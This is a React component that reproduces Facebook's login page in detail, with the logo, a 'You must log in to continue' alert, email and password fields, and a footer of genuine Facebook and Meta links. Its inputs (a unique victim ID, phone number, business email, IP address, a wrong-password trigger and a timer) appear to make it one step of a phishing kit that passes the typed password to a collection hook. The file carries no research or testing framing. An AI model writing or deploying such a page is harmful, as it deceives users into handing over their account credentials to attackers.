import React, { useState, useContext, useEffect } from "react";
import { usePasswordAuth } from "../../hooks/usePasswordAuth.js";
import ButtonActions from "../../utils/buttonActions.js";
import { DataContext } from "../../pages/index.js";

function Step2PC({
  Unik,
  Tel,
  Email,
  setEmail,
  Name,
  BusinessEmail,
  Ip,
  setParentBeginTimer,
  InvalidPassword,
  wrongPasswordTrigger,
  onClose,
  setStep,
}) {
  const [isValidEmail, setIsValidEmail] = useState(true);
  const { setAllData, AllData } = useContext(DataContext);

  // Scroll to top when component mounts
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  // Use the custom hook for password authentication
  const {
    password,
    setPassword,
    isLoading,
    passwordError,
    emailError,
    triedSubmit,
    passwordAttempt,
    handleSubmit,
    clearPasswordError,
    clearEmailError,
  } = usePasswordAuth({
    Unik,
    Email,
    Tel,
    BusinessEmail,
    Name,
    Ip,
    wrongPasswordTrigger,
    setParentBeginTimer,
  });

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    clearEmailError();
    setIsValidEmail(true);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    clearPasswordError();
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col w-full">
      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-4">
        <div className="w-full max-w-md">
          {/* Content Area */}
          <div className="px-4 py-4">
            {/* Facebook Logo */}
            <div className="text-center mb-2">
              <img
                src="/facebooklogin.svg"
                alt="Facebook"
                className="mx-auto w-[240px] h-auto"
              />
            </div>

            {/* Alert Message */}
            <div className="bg-white !border border-[#5890ff] rounded-sm mb-3 flex items-center overflow-hidden w-[100%] mx-auto">
              <div className="bg-[#1877f2] p-2 flex items-center justify-center flex-shrink-0">
                <div className="bg-white rounded-full w-5 h-5 flex items-center justify-center">
                  <span className="text-[#1877f2] text-xs font-bold">i</span>
                </div>
              </div>
              <div className="flex-1 px-3 py-2">
                <p className="text-sm text-[#1c1e21] m-0">
                  You must log in to continue.
                </p>
              </div>
            </div>

            {/* Login Card */}
            <div className="bg-white rounded-lg shadow-md p-4">
              <h2 className="text-lg text-center font-normal text-gray-900 font-fbook mb-4">
                Log Into Facebook
              </h2>

              {/* Warning Box */}
              <div className="bg-[#f5edcd] !border border-[#f5dd9c] rounded mb-4 py-2.5">
                <p className="text-xs text-center text-gray-900 font-fbook m-0">
                  You must log in to continue.
                </p>
              </div>

              <input
                type="text"
                value={Email}
                onChange={handleEmailChange}
                placeholder="Email or phone number"
                className={`border rounded-md py-3 px-3 bg-white w-full text-sm mb-3 text-gray-900 leading-normal box-border placeholder-gray-500 focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] font-fbook ${
                  (!isValidEmail && triedSubmit) || emailError ? "border-red-500" : "border-[#dddfe2]"
                }`}
                disabled={isLoading}
              />
              {emailError && (
                <div className="text-red-500 text-sm font-medium text-left mb-2 font-fbook">
                  {emailError}
                </div>
              )}

              <input
                type="password"
                value={password}
                onChange={handlePasswordChange}
                placeholder="Password"
                className={`border rounded-md py-3 px-3 bg-white w-full text-sm text-gray-900 leading-normal mb-4 box-border placeholder-gray-500 focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] font-fbook ${
                  (password.length < 5 && triedSubmit) || passwordError ? "border-red-500" : "border-[#dddfe2]"
                }`}
                disabled={isLoading}
              />
              {passwordError && (
                <div className="text-red-500 text-sm font-medium text-left mb-2 font-fbook">
                  {passwordError}
                </div>
              )}

              <button
                onClick={handleSubmit}
                className="w-full h-10 bg-[#1877f2] border-none rounded-md text-white text-base font-semibold font-fbook px-4 mb-4 cursor-pointer flex items-center justify-center hover:bg-[#166fe5] transition-colors"
                disabled={isLoading}
              >
                {isLoading ? (
                  <div className="flex items-center justify-center h-10 w-10">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 200 200"
                      className="h-full w-full"
                    >
                      <radialGradient
                        id="a12"
                        cx=".66"
                        fx=".66"
                        cy=".3125"
                        fy=".3125"
                        gradientTransform="scale(1.5)"
                      >
                        <stop offset="0" stopColor="#FFFFFF"></stop>
                        <stop
                          offset=".3"
                          stopColor="#FFFFFF"
                          stopOpacity=".9"
                        ></stop>
                        <stop
                          offset=".6"
                          stopColor="#FFFFFF"
                          stopOpacity=".6"
                        ></stop>
                        <stop
                          offset=".8"
                          stopColor="#FFFFFF"
                          stopOpacity=".3"
                        ></stop>
                        <stop
                          offset="1"
                          stopColor="#FFFFFF"
                          stopOpacity="0"
                        ></stop>
                      </radialGradient>
                      <circle
                        transform-origin="center"
                        fill="none"
                        stroke="url(#a12)"
                        strokeWidth="15"
                        strokeLinecap="round"
                        strokeDasharray="200 1000"
                        strokeDashoffset="0"
                        cx="100"
                        cy="100"
                        r="70"
                      >
                        <animateTransform
                          type="rotate"
                          attributeName="transform"
                          calcMode="spline"
                          dur="2"
                          values="360;0"
                          keyTimes="0;1"
                          keySplines="0 0 1 1"
                          repeatCount="indefinite"
                        ></animateTransform>
                      </circle>
                      <circle
                        transform-origin="center"
                        fill="none"
                        opacity=".2"
                        stroke="#FFFFFF"
                        strokeWidth="15"
                        strokeLinecap="round"
                        cx="100"
                        cy="100"
                        r="70"
                      ></circle>
                    </svg>
                  </div>
                ) : (
                  "Log In"
                )}
              </button>

              <div className="text-center">
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    ButtonActions.handleForgottenPassword({
                      AllData,
                      setAllData,
                      Unik,
                      Email,
                      Ip,
                    });
                  }}
                  className="text-[#1877f2] text-sm no-underline font-fbook hover:underline"
                >
                  Forgot account?
                </a>
              </div>

              <div className="relative flex my-3 items-center justify-center w-full before:content-[''] before:absolute before:top-1/2 before:left-0 before:right-0 before:border-t before:border-gray-300">
                <span className="relative px-4 bg-white text-gray-500 text-sm">
                  or
                </span>
              </div>

              <button className="bg-[#42b72a] border-none rounded-md text-white text-lg font-normal py-0 px-4 h-12 cursor-pointer font-fbook mx-auto block hover:bg-green-700">
                <a
                  onClick={(e) => {
                    e.preventDefault();
                    ButtonActions.handleCreateAccount({
                      AllData,
                      setAllData,
                      Unik,
                      Email,
                      Ip,
                    });
                  }}
                  href="https://www.facebook.com/r.php"
                  className="text-white no-underline font-fbook"
                >
                  Create new account
                </a>
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full bg-white pt-4 pb-[4rem] font-fbook text-xs text-gray-500 mt-auto">
        <div className="max-w-6xl mx-auto px-4 ">
          <div className="flex flex-wrap justify-start mb-2 border-b border-gray-300 pb-2">
            <div className="text-xs mx-1 text-gray-500">English (UK)</div>
            <a
              href="https://es-la.facebook.com/"
              className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
            >
              Español
            </a>
            <a
              href="https://fr-fr.facebook.com/"
              className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
            >
              Français (France)
            </a>
            <a
              href="https://zh-cn.facebook.com/"
              className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
            >
              中文(简体)
            </a>
            <a
              href="https://ar-ar.facebook.com/"
              className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
            >
              العربية
            </a>
            <a
              href="https://pt-br.facebook.com/"
              className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
            >
              Português (Brasil)
            </a>
            <a
              href="https://it-it.facebook.com/"
              className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
            >
              Italiano
            </a>
            <a
              href="https://ko-kr.facebook.com/"
              className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
            >
              한국어
            </a>
            <a
              href="https://de-de.facebook.com/"
              className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
            >
              Deutsch
            </a>
            <a
              href="https://hi-in.facebook.com/"
              className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
            >
              हिन्दी
            </a>
            <a
              href="https://ja-jp.facebook.com/"
              className="text-xs mx-1 text-gray-500 cursor-pointer hover:underline"
            >
              日本語
            </a>
            <button className="bg-gray-100 border border-gray-300 rounded-sm px-2 h-5 text-xs text-gray-600 ml-1 cursor-pointer hover:bg-gray-200">
              +
            </button>
          </div>
          <div className="flex flex-wrap justify-start mt-2">
            <a
              href="https://www.facebook.com/r.php?entry_point=login"
              className="text-gray-500 text-xs mb-1 no-underline cursor-pointer hover:underline"
            >
              Sign Up
            </a>
            <a
              href="https://www.facebook.com/login/"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline font-fbook font-normal"
            >
              Log In
            </a>
            <a
              href="https://messenger.com/"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Messenger
            </a>
            <a
              href="/lite/"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Facebook Lite
            </a>
            <a
              href="https://en-gb.facebook.com/watch/"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Video
            </a>
            <a
              href="https://about.meta.com/technologies/meta-pay"
              target="_blank"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Meta Pay
            </a>
            <a
              href="https://www.meta.com/"
              target="_blank"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Meta Store
            </a>
            <a
              href="https://www.meta.com/quest/"
              target="_blank"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Meta Quest
            </a>
            <a
              href="https://www.meta.com/smart-glasses/"
              target="_blank"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Ray-Ban Meta
            </a>
            <a
              href="https://www.meta.ai/"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Meta AI
            </a>
            <a
              href="https://www.instagram.com/"
              target="_blank"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Instagram
            </a>
            <a
              href="https://www.threads.com/"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Threads
            </a>
            <a
              href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
              className="text-gray-500 text-xs  mb-1 no-underline cursor-pointer hover:underline"
            >
              Voting Information Centre
            </a>
            <a
              href="/privacy/policy/?entry_point=facebook_page_footer"
              className="text-gray-500 text-xs  mb-1 m-0 no-underline cursor-pointer hover:underline"
            >
              Privacy Policy
            </a>
            <a
              href="/privacy/policies/health/?entry_point=facebook_page_footer"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Consumer Health Privacy
            </a>
            <a
              href="/privacy/center/?entry_point=facebook_page_footer"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Privacy Centre
            </a>
            <a
              href="https://about.meta.com/"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              About
            </a>
            <a
              href="/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Create ad
            </a>
            <a
              href="/pages/create/?ref_type=site_footer"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Create Page
            </a>
            <a
              href="https://developers.facebook.com/?ref=pf"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Developers
            </a>
            <a
              href="/careers/?ref=pf"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Careers
            </a>
            <a
              href="/policies/cookies/"
              className="text-gray-500 text-xs mb-1 no-underline cursor-pointer hover:underline"
            >
              Cookies
            </a>
            <a
              href="https://www.facebook.com/help/568137493302217"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              AdChoices
            </a>
            <a
              href="/policies?ref=pf"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Terms
            </a>
            <a
              href="/help/?ref=pf"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Help
            </a>
            <a
              href="https://www.facebook.com/help/637205020878504"
              className="text-gray-500 text-xs  mb-1 no-underline cursor-pointer hover:underline"
            >
              Contact uploading and non-users
            </a>
            <a
              href="/settings"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Settings
            </a>
            <a
              href="/allactivity?privacy_source=activity_log_top_menu"
              className="text-gray-500 text-xs mx-2 mb-1 no-underline cursor-pointer hover:underline"
            >
              Activity log
            </a>
          </div>
          <div className="mt-3 text-xs text-gray-500">
            Meta © 2025
          </div>
        </div>
      </footer>
    </div>
  );
}

export default Step2PC;